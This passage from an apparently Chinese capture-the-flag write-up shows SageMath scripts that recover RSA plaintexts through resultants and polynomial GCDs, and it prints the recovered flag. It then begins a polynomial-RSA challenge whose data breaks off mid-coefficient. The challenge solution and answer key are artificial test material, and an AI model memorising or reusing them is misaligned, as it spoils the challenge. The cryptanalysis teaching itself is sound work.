class="number">1</span>]))</span><br><span class="line">f2 = m2**e - c2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">    <span class="keyword">while</span> g2:</span><br><span class="line">        g1, g2 = g2, g1 % g2</span><br><span class="line">    <span class="comment"># print(g1)</span></span><br><span class="line">    <span class="keyword">return</span> g1.monic()</span><br><span class="line">m2 = <span class="built_in">int</span>(-gcd(rres, f2)[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m2))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># get m1 (Method 1)</span></span><br><span class="line"><span class="string">rres = 0</span></span><br><span class="line"><span class="string">P.&lt;m1&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="string">for i in range(len(res2.coefficients())):</span></span><br><span class="line"><span class="string">    # print(res1.coefficients()[i]*(m1^(res1.exponents()[i][1]))</span></span><br><span class="line"><span class="string">    rres += res2.coefficients()[i]*(m1^(res2.exponents()[i][0]))</span></span><br><span class="line"><span class="string">f1 = m1**e - c1</span></span><br><span class="line"><span class="string"># print(rres)</span></span><br><span class="line"><span class="string">def gcd(g1, g2):</span></span><br><span class="line"><span class="string">    while g2:</span></span><br><span class="line"><span class="string">        g1, g2 = g2, g1 % g2</span></span><br><span class="line"><span class="string">    # print(g1)</span></span><br><span class="line"><span class="string">    return g1.monic()</span></span><br><span class="line"><span class="string">m1 = int(-gcd(rres, f1)[0])</span></span><br><span class="line"><span class="string"># print(long_to_bytes(m1))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get m1 (Method 2)</span></span><br><span class="line">P.&lt;m1&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f1 = m1**e - c1</span><br><span class="line">f3 = (m1+m2+gift)**e - c3</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">    <span class="keyword">while</span> g2:</span><br><span class="line">        g1, g2 = g2, g1 % g2</span><br><span class="line">    <span class="comment"># print(g1)</span></span><br><span class="line">    <span class="keyword">return</span> g1.monic()</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(-gcd(f3, f1)[<span class="number">0</span>])))</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;W1Sh_you_Bec0me_an_excelL3nt_crypt0G2@pher&#125;</span></span><br></pre></td></tr></table></figure>

<p>首先对f1和f3打结式，和f2作gcd得到m2。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res1.coefficients())):</span><br><span class="line">    rres += res1.coefficients()[i]*(m2^(res1.exponents()[i][<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<p>这一步的目的是因为虽然res只包含y，但它还是在二元多项式环空间中，我们提取系数和指数重新生成一个一元多项式。</p>
<h1 id="二，多项式RSA"><a href="#二，多项式RSA" class="headerlink" title="二，多项式RSA"></a>二，多项式RSA</h1><h2 id="1，CTFshow-unusualrsa3"><a href="#1，CTFshow-unusualrsa3" class="headerlink" title="1，CTFshow-unusualrsa3"></a>1，CTFshow-unusualrsa3</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line">p: </span><br><span class="line"><span class="number">2470567871</span></span><br><span class="line"></span><br><span class="line">N: </span><br><span class="line"><span class="number">1932231392</span>*x^<span class="number">255</span> + <span class="number">1432733708</span>*x^<span class="number">254</span> + <span class="number">1270867914</span>*x^<span class="number">253</span> + <span class="number">1573324635</span>*x^<span class="number">252</span> + <span class="number">2378103997</span>*x^<span class="number">251</span> + <span class="number">820889786</span>*x^<span class="number">250</span> + <span class="number">762279735</span>*x^<span class="number">249</span> + <span class="number">1378353578</span>*x^<span class="number">248</span> + <span class="number">1226179520</span>*x^<span class="number">247</span> + <span class="number">657116276</span>*x^<span class="number">246</span> + <span class="number">1264717357</span>*x^<span class="number">245</span> + <span class="number">1015587392</span>*x^<span class="number">244</span> + <span class="number">849699356</span>*x^<span class="number">243</span> + <span class="number">1509168990</span>*x^<span class="number">242</span> + <span class="number">2407367106</span>*x^<span class="number">241</span> + <span class="number">873379233</span>*x^<span class="number">240</span> + <span class="number">2391647981</span>*x^<span class="number">239</span> + <span class="number">517715639</span>*x^<span class="number">238</span> + <span class="number">828941376</span>*x^<span class="number">237</span> + <span class="number">843708018</span>*x^<span class="number">236</span> + <span class="number">1526075137</span>*x^<span class="number">235</span> + <span class="number">1499291590</span>*x^<span class="number">234</span> + <span class="number">235611028</span>*x^<span class="number">233</span> + <span class="number">19615265</span>*x^<span class="number">232</span> + <span class="number">53338886</span>*x^<span class="number">231</span> + <span class="number">434434839</span>*x^<span class="number">230</span> + <span class="number">902171938</span>*x^<span class="number">229</span> + <span class="number">516444143</span>*x^<span class="number">228</span> + <span class="number">1984443642</span>*x^<span class="number">227</span> + <span class="number">966493372</span>*x^<span class="number">226</span> + <span class="number">1166227650</span>*x^<span class="number">225</span> + <span class="number">1824442929</span>*x^<span class="number">224</span> + <span class="number">930231465</span>*x^<span class="number">223</span> + <span class="number">1664522302</span>*x^<span class="number">222</span> + <span class="number">1067203343</span>*x^<span class="number">221</span> + <span class="number">28569139</span>*x^<span class="number">220</span> + <span class="number">2327926559</span>*x^<span class="number">219</span> + <span class="number">899788156</span>*x^<span class="number">218</span> + <span class="number">296985783</span>*x^<span class="number">217</span> + <span class="number">1144578716</span>*x^<span class="number">216</span> + <span class="number">340677494</span>*x^<span class="number">215</span> + <span class="number">254306901</span>*x^<span class="number">214</span> + <span class="number">766641243</span>*x^<span class="number">213</span> + <span class="number">1882320336</span>*x^<span class="number">212</span> + <span class="number">2139903463</span>*x^<span class="number">211</span> + <span class="number">1904225023</span>*x^<span class="number">210</span> + <span class="number">475412928</span>*x^<span class="number">209</span> + <span class="number">127723603</span>*x^<span class="number">208</span> + <span class="number">2015416361</span>*x^<span class="number">207</span> + <span class="number">1500078813</span>*x^<span class="number">206</span> + <span class="number">1845826007</span>*x^<span class="number">205</span> + <span class="number">797486240</span>*x^<span class="number">204</span> + <span class="number">85924125</span>*x^<span class="number">203</span> + <span class="number">1921772796</span>*x^<span class="number">202</span> + <span class="number">1322682658</span>*x^<span class="number">201</span> + <span class="number">2372929383</span>*x^<span class="number">200</span> + <span class="number">1323964787</span>*x^<span class="number">199</span> + <span class="number">1302258424</span>*x^<span class="number">198</span> + <span class="number">271875267</span>*x^<span class="number">197</span> + <span class="number">1297768962</span>*x^<span class="number">196</span> + <span class="number">2147341770</span>*x^<span class="number">195</span> + <span class="number">1665066191</span>*x^<span class="number">194</span> + <span class="number">2342921569</span>*x^<span class="number">193</span> + <span class="number">1450622685</span>*x^<span class="number">192</span> + <span class="number">1453466049</span>*x^<span class="number">191</span> + <span class="number">1105227173</span>*x^<span class="number">190</span> + <span class="number">2357717379</span>*x^<span class="number">189</span> + <span class="number">1044263540</span>*x^<span class="number">188</span> + <span class="number">697816284</span>*x^<span class="number">187</span> + <span class="number">647124526</span>*x^<span class="number">186</span> + <span class="number">1414769298</span>*x^<span class="number">185</span> + <span class="number">657373752</span>*x^<span class="number">184</span> + <span class="number">91863906</span>*x^<span class="number">183</span> + <span class="number">1095083181</span>*x^<span class="number">182</span> + <span class="number">658171402</span>*x^<span class="number">181</span> + <span class="number">75339882</span>*x^<span class="number">180</span> + <span class="number">2216678027</span>*x^<span class="number">179</span> + <span class="number">2208320155</span>*x^<span class="number">178</span> + <span class="number">1351845267</span>*x^<span class="number">177</span> + <span class="number">1740451894</span>*x^<span class="number">176</span> + <span class="number">1302531891</span>*x^<span class="number">175</span> + <span class="number">320751753</span>*x^<span class="number">174</span> + <span class="number">1303477598</span>*x^<span class="number">173</span> + <span class="number">783321123</span>*x^<span class="number">172</span> + <span class="number">1400145206</span>*x^<span class="number">171</span> + <span class="number">1379768234</span>*x^<span class="number">170</span> + <span class="number">1191445903</span>*x^<span class="number">169</span> + <span class="number">946530449</span>*x^<span class="number">168</span> + <span class="number">2008674144</span>*x^<span class="number">167</span> + <span class="number">2247371104</span>*x^<span class="number">166</span> + <span class="number">1267042416</span>*x^<span class="number">165</span> + <span class="number">1795774455</span>*x^<span class="number">164</span> + <span class="number">1976911493</span>*x^<span class="number">163</span> + <span class="number">167037165</span>*x^<span class="number">162</span> + <span class="number">1848717750</span>*x^<span class="number">161</span> + <span class="number">573072954</span>*x^<span class="number">160</span> + <span class="number">1126046031</span>*x^<span class="number">159</span> + <span class="number">376257986</span>*x^<span class="number">158</span> + <span class="number">1001726783</span>*x^<span class="number">157</span> + <span class="number">2250967824</span>*x^<span class="number">156</span> + <span class="number">2339380314</span>*x^<span class="number">155</span> + <span class="number">571922874</span>*x^<span class="number">154</span> + <span class="number">961000788</span>*x^<span class="number">153</span> + <span class="number">306686020</span>*x^<span class="number">152</span> + <span class="number">80717392</span>*x^<span class="number">151</span> + <span class="number">2454799241</span>*x^<span class="number">150</span> + <span class="number">1005427673</span>*x^<span class="number">149</span> + <span class="number">1032257735</span>*x^<span class="number">148</span> + <span class="number">593980163</span>*x^<span class="number">147</span> + <span class="number">1656568780</span>*x^<span class="number">146</span> + <span class="number">1865541316</span>*x^<span class="number">145</span> + <span class="number">2003844061</span>*x^<span class="number">144</span> + <span class="number">1265566902</span>*x^<span class="number">143</span> + <span class="number">573548790</span>*x^<span class="number">142</span> + <span class="number">494063408</span>*x^<span class="number">141</span> + <span class="number">1722266624</span>*x^<span class="number">140</span> + <span class="number">938551278</span>*x^<span class="number">139</span> + <span class="number">2284832499</span>*x^<span class="number">138</span> + <span class="number">597191613</span>*x^<span class="number">137</span> + <span class="number">476121126</span>*x^<span class="number">136</span> + <span class="number">1237943942</span>*x^<span class="number">135</span> + <span class="number">275861976</span>*x^<span class="number">134</span> + <span class="number">1603993606</span>*x^<span class="number">133</span> + <span class="number">1895285286</span>*x^<span class="number">132</span> + <span class="number">589034062</span>*x^<span class="number">131</span> + <span class="number">713986937</span>*x^<span class="number">130</span> + <span class="number">1206118526</span>*x^<span class="number">129</span> + <span class="number">311679750</span>*x^<span class="number">128</span> + <span class="number">1989860861</span>*x^<span class="number">127</span> + <span class="number">1551409650</span>*x^<span class="number">126</span> + <span class="number">2188452501</span>*x^<span class="number">125</span> + <span class="number">1175930901</span>*x^<span class="number">124</span> + <span class="number">1991529213</span>*x^<span class="number">123</span> + <span class="number">2019090583</span>*x^<span class="number">122</span> + <span class="number">215965300</span>*x^<span class="number">121</span> + <span class="number">532432639</span>*x^<span class="number">120</span> + <span class="number">1148806816</span>*x^<span class="number">119</span> + <span class="number">493362403</span>*x^<span class="number">118</span> + <span class="number">2166920790</span>*x^<span class="number">117</span> + <span class="number">185609624</span>*x^<span class="number">116</span> + <span class="number">184370704</span>*x^<span class="number">115</span> + <span class="number">2141702861</span>*x^<span class="number">114</span> + <span class="number">223551915</span>*x^<span class="number">113</span> + <span class="number">298497455</span>*x^<span class="number">112</span> + <span class="number">722376028</span>*x^<span class="number">111</span> + <span class="number">678813029</span>*x^<span class="number">110</span> + <span class="number">915121681</span>*x^<span class="number">109</span> + <span class="number">1107871854</span>*x^<span class="number">108</span> + <span class="number">1369194845</span>*x^<span class="number">107</span> + <span class="number">328165402</span>*x^<span class="number">106</span> + <span class="number">1792110161</span>*x^<span class="number">105</span> + <span class="number">798151427</span>*x^<span class="number">104</span> + <span class="number">954952187</span>*x^<span class="number">103</span> + <span class="number">471555401</span>*x^<span class="number">102</span> + <span class="number">68969853</span>*x^<span class="number">101</span> + <span class="number">453598910</span>*x^<span class="number">100</span> + <span class="number">2458706380</span>*x^<span class="number">99</span> + <span class="number">889221741</span>*x^<span class="number">98</span> + <span class="number">320515821</span>*x^<span class="number">97</span> + <span class="number">1549538476</span>*x^<span class="number">96</span> + <span class="number">909607400</span>*x^<span class="number">95</span> + <span class="number">499973742</span>*x^<span class="number">94</span> + <span class="number">552728308</span>*x^<span class="number">93</span> + <span class="number">1538610725</span>*x^<span class="number">92</span> + <span class="number">186272117</span>*x^<span class="number">91</span> + <span class="number">862153635</span>*x^<span class="number">90</span> + <span class="number">981463824</span>*x^<span class="number">89</span> + <span class="number">2400233482</span>*x^<span class="number">88</span> + <span class="number">1742475067</span>*x^<span class="number">87</span> + <span class="number">437801940</span>*x^<span class="number">86</span> + <span class="number">1504315277</span>*x^<span class="number">85</span> + <span class="number">1756497351</span>*x^<span class="number">84</span> + <span class="number">197089583</span>*x^<span class="number">83</span> + <span class="number">2082285292</span>*x^<span class="number">82</span> + <span class="number">109369793</span>*x^<span class="number">81</span> + <span class="number">2197572728</span>*x^<span class="number">80</span> + <span class="number">107235697</span>*x^<span class="number">79</span> + <span class="number">567322310</span>*x^<span class="number">78</span> + <span class="number">1755205142</span>*x^<span class="number">77</span> + <span class="number">1089091449</span>*x^<span class="number">76</span> + <span class="number">1993836978</span>*x^<span class="number">75</span> + <span class="number">2393709429</span>*x^<span class="number">74</span> + <span class="number">170647828</span>*x^<span class="number">73</span> + <span class="number">1205814501</span>*x^<span class="number">72</span> + <span class="number">2444570340</span>*x^<span class="number">71</span> + <span class="number">328372190</span>*x^<span class="number">70</span> + <span class="number">1929704306</span>*x^<span class="number">69</span> + <span class="number">717796715</span>*x^<span class="number">68</span> + <span class="number">1057597610</span>*x^<span class="number">67</span> + <span class="number">482243092</span>*x^<span class="number">66</span> + <span class="number">277530014</span>*x^<span class="number">65</span> + <span class="number">2393168828</span>*x^<span class="number">64</span> + <span class="number">12380707</span>*x^<span class="number">63</span> + <span class="number">1108646500</span>*x^<span class="number">62</span> + <span class="number">637721571</span>*x^<span class="number">61</span> + <span class="number">604983755</span>*x^<span class="number">60</span> + <span class="number">1142068056</span>*x^<span class="number">59</span> + <span class="number">1911643955</span>*x^<span class="number">58</span> + <span class="number">1713852330</span>*x^<span class="number">57</span> + <span class="number">1757273231</span>*x^<span class="number">56</span> + <span class="number">1778819295</span>*x^<span class="number">55</span> + <span class="number">957146826</span>*x^<span class="number">54</span> + <span class="number">900005615</span>*x^<span class="number">53</span> + <span class="number">521467961</span>*x^<span class="number">52</span> + <span class="number">1255707235</span>*x^<span class="number">51</span> + <span class="number">861871574</span>*x^<span class="number">50</span> + <span class="number">397953653</span>*x^<span class="number">49</span> + <span class="number">1259753202</span>*x^<span class="number">48</span> + <span class="number">471431762</span>*x^<span class="number">47</span> + <span class="number">1245956917</span>*x^<span class="number">46</span> + <span class="number">1688297180</span>*x^<span class="number">45</span> + <span class="number">1536178591</span>*x^<span class="number">44</span> + <span class="number">1833258462</span>*x^<span class="number">43</span> + <span class="number">1369087493</span>*x^<span class="number">42</span> + <span class="number">459426544</span>*x^<span class="number">41</span> + <span class="number">418389643</span>*x^<span class="number">40</span> + <span class="number">1800239647</span>*x^<span class="number">39</span> + <span class="number">2467433889</span>*x^<span class="number">38</span> + <span class="number">477713059</span>*x^<span class="number">37</span> + <span class="number">1898813986</span>*x^<span class="number">36</span> + <span class="number">2202042708</span>*x^<span class="number">35</span> + <span class="number">894088738</span>*x^<span class="number">34</span> + <span class="number">1204601190</span>*x^<span class="number">33</span> + <span class="number">1592921228</span>*x^<span class="number">32</span> + <span class="number">2234027582</span>*x^<span class="number">31</span> + <span class="number">1308900201</span>*x^<span class="number">30</span> + <span class="number">461430959</span>*x^<span class="number">29</span> + <span class="number">718926726</span>*x^<span class="number">28</span> + <span class="number">2081988029</span>*x^<span class="number">27</span> + <span class="number">1337342428</span>*x^<span class="number">26</span> + <span class="number">2039153142</span>*x^<span class="number">25</span> + <span class="number">1364177470</span>*x^<span class="number">24</span> + <span class="number">613659517</span>*x^<span class="number">23</span> + <span class="number">853968854</span>*x^<span class="number">22</span> + <span class="number">1013582418</span>*x^<span class="number">21</span> + <span class="number">1167857934</span>*x^<span class="number">20</span> + <span class="number">2014147362</span>*x^<span class="number">19</span> + <span class="number">1083466865</span>*x^<span class="number">18</span> + <span class="number">1091690302</span>*x^<span class="number">17</span> + <span class="number">302196939</span>*x^<span class="number">16</span> + <span class="number">1946675573</span>*x^<span class="number">15</span> + <span class="number">2450124113</span>*x^<span class="number">14</span> + <span class="number">1199066291</span>*x^<span class="number">13</span> + <span class="number">401889502</span>*x^<span class="number">12</span> + <span class="number">712045611</span>*x^<span class="number">11</span> + <span class="number">1850096904</span>*x^<span class="number">10</span> + <span class="number">1808400208</span>*x^<span class="number">9</span> + <span class="number">1567687877</span>*x^<span class="number">8</span> + <span class="number">2013445952</span>*x^<span class="number">7</span> + <span class="number">2435360770</span>*x^<span class="number">6</span> + <span class="number">2414019676</span>*x^<span class="number">5</span> + <span class="number">2277377050</span>*x^<span class="number">4</span> + <span class="number">2148341337</span>*x^<span class="number">3</span> + <span class="number">1073721716</span>*x^<span class="number">2</span> + <span class="number">1045363399</span>*x + <span class="number">1809685811</span></span><br><span class="line"></span><br><span class="line">m^<span class="number">0x10001</span>%N:  </span><br><span class="line"><span class="number">922927962</span>*x^<span class="number">254</span> + <span class="number">1141958714</span>*x^<span class="number">253</span> + <span class="number">295409606</span>*x^<span class="number">252</span> + <span class="number">1197491798</span>*x^<span class="number">251</span> + <span class="number">2463440866</span>*x^<span class="number">250</span> + <span class="number">1671460946</span>*x^<span class="number">249</span> + <span class="number">967543123</span>*x^<span class="number">248</span> + <span class="number">119796323</span>*x^<span class="number">247</span> + <span class="number">1172760592</span>*x^<span class="number">246</span> + <span class="number">770640267</span>*x^<span class="number">245</span> + <span class="number">1093816376</span>*x^<span class="number">244</span> + <span class="number">196379610</span>*x^<span class="number">243</span> + <span class="number">2205270506</span>*x^<span class="number">242</span> + <span class="number">459693142</span>*x^<span class="number">241</span> + <span class="number">829093322</span>*x^<span class="number">240</span> + <span class="number">816440689</span>*x^<span class="number">239</span> + <span class="number">648546871</span>*x^<span class="number">238</span> + <span class="number">1533372161</span>*x^<span class="number">237</span> + <span class="number">1349964227</span>*x^<span class="number">236</span> + <span class="number">2132166634</span>*x^<span class="number">235</span> + <span class="number">403690250</span>*x^<span class="number">234</span> + <span class="number">835793319</span>*x^<span class="number">233</span> + <span class="number">2056945807</span>*x^<span class="number">232</span> + <span class="number">480459588</span>*x^<span class="number">231</span> + <span class="number">1401028924</span>*x^<span class="number">230</span> + <span class="number">2231055325</span>*x^<span class="number">229</span> + <span class="number">1716893325</span>*x^<span class="number">228</span> + <span class="number">16299164</span>*x^<span class="number">227</span> + <span class="number">1125072063</span>*x^<span class="number">226</span> + <span class="number">1903340994</span>*x^<span class="number">225</span> + <span class="number">1372971897</span>*x^<span class="number">224</span> + <span class="number">242927971</span>*x^<span class="number">223</span> + <span class="number">711296789</span>*x^<span class="number">222</span> + <span class="number">535407256</span>*x^<span class="number">221</span> + <span class="number">976773179</span>*x^<span class="number">220</span> + <span class="number">533569974</span>*x^<span class="number">219</span> + <span class="number">501041034</span>*x^<span class="number">218</span> + <span class="number">326232105</span>*x^<span class="number">217</span> + <span class="number">2248775507</span>*x^<span class="number">216</span> + <span class="number">1010397596</span>*x^<span class="number">215</span> + <span class="number">1641864795</span>*x^<span class="number">214</span> + <span class="number">1365178317</span>*x^<span class="number">213</span> + <span class="number">1038477612</span>*x^<span class="number">212</span> + <span class="number">2201213637</span>*x^<span class="number">211</span> + <span class="number">760847531</span>*x^<span class="number">210</span> + <span class="number">2072085932</span>*x^<span class="number">209</span> + <span class="number">168159257</span>*x^<span class="number">208</span> + <span class="number">70202009</span>*x^<span class="number">207</span> + <span class="number">1193933930</span>*x^<span class="number">206</span> + <span class="number">1559162272</span>*x^<span class="number">205</span> + <span class="number">1380642174</span>*x^<span class="number">204</span> + <span class="number">1296625644</span>*x^<span class="number">203</span> + <span class="number">1338288152</span>*x^<span class="number">202</span> + <span class="number">843839510</span>*x^<span class="number">201</span> + <span class="number">460174838</span>*x^<span class="number">200</span> + <span class="number">660412151</span>*x^<span class="number">199</span> + <span class="number">716865491</span>*x^<span class="number">198</span> + <span class="number">772161222</span>*x^<span class="number">197</span> + <span class="number">924177515</span>*x^<span class="number">196</span> + <span class="number">1372790342</span>*x^<span class="number">195</span> + <span class="number">320044037</span>*x^<span class="number">194</span> + <span class="number">117027412</span>*x^<span class="number">193</span> + <span class="number">814803809</span>*x^<span class="number">192</span> + <span class="number">1175035545</span>*x^<span class="number">191</span> + <span class="number">244769161</span>*x^<span class="number">190</span> + <span class="number">2116927976</span>*x^<span class="number">189</span> + <span class="number">617780431</span>*x^<span class="number">188</span> + <span class="number">342577832</span>*x^<span class="number">187</span> + <span class="number">356586691</span>*x^<span class="number">186</span> + <span class="number">695795444</span>*x^<span class="number">185</span> + <span class="number">281750528</span>*x^<span class="number">184</span> + <span class="number">133432552</span>*x^<span class="number">183</span> + <span class="number">741747447</span>*x^<span class="number">182</span> + <span class="number">2138036298</span>*x^<span class="number">181</span> + <span class="number">524386605</span>*x^<span class="number">180</span> + <span class="number">1231287380</span>*x^<span class="number">179</span> + <span class="number">1246706891</span>*x^<span class="number">178</span> + <span class="number">69277523</span>*x^<span class="number">177</span> + <span class="number">2124927225</span>*x^<span class="number">176</span> + <span class="number">2334697345</span>*x^<span class="number">175</span> + <span class="number">1769733543</span>*x^<span class="number">174</span> + <span class="number">2248037872</span>*x^<span class="number">173</span> + <span class="number">1899902290</span>*x^<span class="number">172</span> + <span class="number">409421149</span>*x^<span class="number">171</span> + <span class="number">1223261878</span>*x^<span class="number">170</span> + <span class="number">666594221</span>*x^<span class="number">169</span> + <span class="number">1795456341</span>*x^<span class="number">168</span> + <span class="number">406003299</span>*x^<span class="number">167</span> + <span class="number">992699270</span>*x^<span class="number">166</span> + <span class="number">2201384104</span>*x^<span class="number">165</span> + <span class="number">907692883</span>*x^<span class="number">164</span> + <span class="number">1667882231</span>*x^<span class="number">163</span> + <span class="number">1414341647</span>*x^<span class="number">162</span> + <span class="number">1592159752</span>*x^<span class="number">161</span> + <span class="number">28054099</span>*x^<span class="number">160</span> + <span class="number">2184618098</span>*x^<span class="number">159</span> + <span class="number">2047102725</span>*x^<span class="number">158</span> + <span class="number">103202495</span>*x^<span class="number">157</span> + <span class="number">1803852525</span>*x^<span class="number">156</span> + <span class="number">446464179</span>*x^<span class="number">155</span> + <span class="number">909116906</span>*x^<span class="number">154</span> + <span class="number">1541693644</span>*x^<span class="number">153</span> + <span class="number">166545130</span>*x^<span class="number">152</span> + <span class="number">2283548843</span>*x^<span class="number">151</span> + <span class="number">2348768005</span>*x^<span class="number">150</span> + <span class="number">71682607</span>*x^<span class="number">149</span> + <span class="number">484339546</span>*x^<span class="number">148</span> + <span class="number">669511666</span>*x^<span class="number">147</span> + <span class="number">2110974006</span>*x^<span class="number">146</span> + <span class="number">1634563992</span>*x^<span class="number">145</span> + <span class="number">1810433926</span>*x^<span class="number">144</span> + <span class="number">2388805064</span>*x^<span class="number">143</span> + <span class="number">1200258695</span>*x^<span class="number">142</span> + <span class="number">1555191384</span>*x^<span class="number">141</span> + <span class="number">363842947</span>*x^<span class="number">140</span> + <span class="number">1105757887</span>*x^<span class="number">139</span> + <span class="number">402111289</span>*x^<span class="number">138</span> + <span class="number">361094351</span>*x^<span class="number">137</span> + <span class="number">1788238752</span>*x^<span class="number">136</span> + <span class="number">2017677334</span>*x^<span class="number">135</span> + <span class="number">1506224550</span>*x^<span class="number">134</span> + <span class="number">648916609</span>*x^<span class="number">133</span> + <span class="number">2008973424</span>*x^<span class="number">132</span> + <span class="number">2452922307</span>*x^<span class="number">131</span> + <span class="number">1446527028</span>*x^<span class="number">130</span> + <span class="number">29659632</span>*x^<span class="number">129</span> + <span class="number">627390142</span>*x^<span class="number">128</span> + <span class="number">1695661760</span>*x^<span class="number">127</span> + <span class="number">734686497</span>*x^<span class="number">126</span> + <span class="number">227059690</span>*x^<span class="number">125</span> + <span class="number">1219692361</span>*x^<span class="number">124</span> + <span class="number">635166359</span>*x^<span class="number">123</span> + <span class="number">428703291</span>*x^<span class="number">122</span> + <span class="number">2334823064</span>*x^<span class="number">121</span> + <span class="number">204888978</span>*x^<span class="number">120</span> + <span class="number">1694957361</span>*x^<span class="number">119</span> + <span class="number">94211180</span>*x^<span class="number">118</span> + <span class="number">2207723563</span>*x^<span class="number">117</span> + <span class="number">872340606</span>*x^<span class="number">116</span> + <span class="number">46197669</span>*x^<span class="number">115</span> + <span class="number">710312088</span>*x^<span class="number">114</span> + <span class="number">305132032</span>*x^<span class="number">113</span> + <span class="number">1621042631</span>*x^<span class="number">112</span> + <span class="number">2023404084</span>*x^<span class="number">111</span> + <span class="number">2169254305</span>*x^<span class="number">110</span> + <span class="number">463525650</span>*x^<span class="number">109</span> + <span class="number">2349964255</span>*x^<span class="number">108</span> + <span class="number">626689949</span>*x^<span class="number">107</span> + <span class="number">2072533779</span>*x^<span class="number">106</span> + <span class="number">177264308</span>*x^<span class="number">105</span> + <span class="number">153948342</span>*x^<span class="number">104</span> + <span class="number">1992646054</span>*x^<span class="number">103</span> + <span class="number">2379817214</span>*x^<span class="number">102</span> + <span class="number">1396334187</span>*x^<span class="number">101</span> + <span class="number">2254165812</span>*x^<span class="number">100</span> + <span class="number">1300455472</span>*x^<span class="number">99</span> + <span class="number">2396842759</span>*x^<span class="number">98</span> + <span class="number">2398953180</span>*x^<span class="number">97</span> + <span class="number">88249450</span>*x^<span class="number">96</span> + <span class="number">1726340322</span>*x^<span class="number">95</span> + <span class="number">2004986735</span>*x^<span class="number">94</span> + <span class="number">2446249940</span>*x^<span class="number">93</span> + <span class="number">520126803</span>*x^<span class="number">92</span> + <span class="number">821544954</span>*x^<span class="number">91</span> + <span class="number">1177737015</span>*x^<span class="number">90</span> + <span class="number">676286546</span>*x^<span class="number">89</span> + <span class="number">1519043368</span>*x^<span class="number">88</span> + <span class="number">224894464</span>*x^<span class="number">87</span> + <span class="number">1742023262</span>*x^<span class="number">86</span> + <span class="number">142627164</span>*x^<span class="number">85</span> + <span class="number">1427710141</span>*x^<span class="number">84</span> + <span class="number">1504189919</span>*x^<span class="number">83</span> + <span class="number">688315682</span>*x^<span class="number">82</span> + <span class="number">1397842239</span>*x^<span class="number">81</span> + <span class="number">435187331</span>*x^<span class="number">80</span> + <span class="number">433176780</span>*x^<span class="number">79</span> + <span class="number">454834357</span>*x^<span class="number">78</span> + <span class="number">1046713282</span>*x^<span class="number">77</span> + <span class="number">1208458516</span>*x^<span class="number">76</span> + <span class="number">811240741</span>*x^<span class="number">75</span> + <span class="number">151611952</span>*x^<span class="number">74</span> + <span class="number">164192249</span>*x^<span class="number">73</span> + <span class="number">353336244</span>*x^<span class="number">72</span> + <span class="number">1779538914</span>*x^<span class="number">71</span> + <span class="number">1489144873</span>*x^<span class="number">70</span> + <span class="number">213140082</span>*x^<span class="number">69</span> + <span class="number">1874778522</span>*x^<span class="number">68</span> + <span class="number">908618863</span>*x^<span class="number">67</span> + <span class="number">1058334731</span>*x^<span class="number">66</span> + <span class="number">1706255211</span>*x^<span class="number">65</span> + <span class="number">708134837</span>*x^<span class="number">64</span> + <span class="number">1382118347</span>*x^<span class="number">63</span> + <span class="number">2111915733</span>*x^<span class="number">62</span> + <span class="number">1273497300</span>*x^<span class="number">61</span> + <span class="number">368639880</span>*x^<span class="number">60</span> + <span class="number">1652005004</span>*x^<span class="number">59</span> + <span class="number">1977610754</span>*x^<span class="number">58</span> + <span class="number">1412680185</span>*x^<span class="number">57</span> + <span class="number">2312775720</span>*x^<span class="number">56</span> + <span class="number">59793381</span>*x^<span class="number">55</span> + <span class="number">1345145822</span>*x^<span class="number">54</span> + <span class="number">627534850</span>*x^<span class="number">53</span> + <span class="number">2159477761</span>*x^<span class="number">52</span> + <span class="number">10450988</span>*x^<span class="number">51</span> + <span class="number">1479007796</span>*x^<span class="number">50</span> + <span class="number">2082579205</span>*x^<span class="number">49</span> + <span class="number">1158447154</span>*x^<span class="number">48</span> + <span class="number">126359830</span>*x^<span class="number">47</span> + <span class="number">393411272</span>*x^<span class="number">46</span> + <span class="number">2343384236</span>*x^<span class="number">45</span> + <span class="number">2191577465</span>*x^<span class="number">44</span> + <span class="number">1281188680</span>*x^<span class="number">43</span> + <span class="number">230049708</span>*x^<span class="number">42</span> + <span class="number">539600199</span>*x^<span class="number">41</span> + <span class="number">1711135601</span>*x^<span class="number">40</span> + <span class="number">1659775448</span>*x^<span class="number">39</span> + <span class="number">1716176055</span>*x^<span class="number">38</span> + <span class="number">904363231</span>*x^<span class="number">37</span> + <span class="number">2385749710</span>*x^<span class="number">36</span> + <span class="number">567278351</span>*x^<span class="number">35</span> + <span class="number">404199078</span>*x^<span class="number">34</span> + <span class="number">372670353</span>*x^<span class="number">33</span> + <span class="number">1286079784</span>*x^<span class="number">32</span> + <span class="number">1744355671</span>*x^<span class="number">31</span> + <span class="number">2316856064</span>*x^<span class="number">30</span> + <span class="number">2106475476</span>*x^<span class="number">29</span> + <span class="number">614988454</span>*x^<span class="number">28</span> + <span class="number">2149964943</span>*x^<span class="number">27</span> + <span class="number">1065233185</span>*x^<span class="number">26</span> + <span class="number">188130174</span>*x^<span class="number">25</span> + <span class="number">540415659</span>*x^<span class="number">24</span> + <span class="number">1031409799</span>*x^<span class="number">23</span> + <span class="number">1067085678</span>*x^<span class="number">22</span> + <span class="number">1005161755</span>*x^<span class="number">21</span> + <span class="number">249654085</span>*x^<span class="number">20</span> + <span class="number">1816791634</span>*x^<span class="number">19</span> + <span class="number">1437500292</span>*x^<span class="number">18</span> + 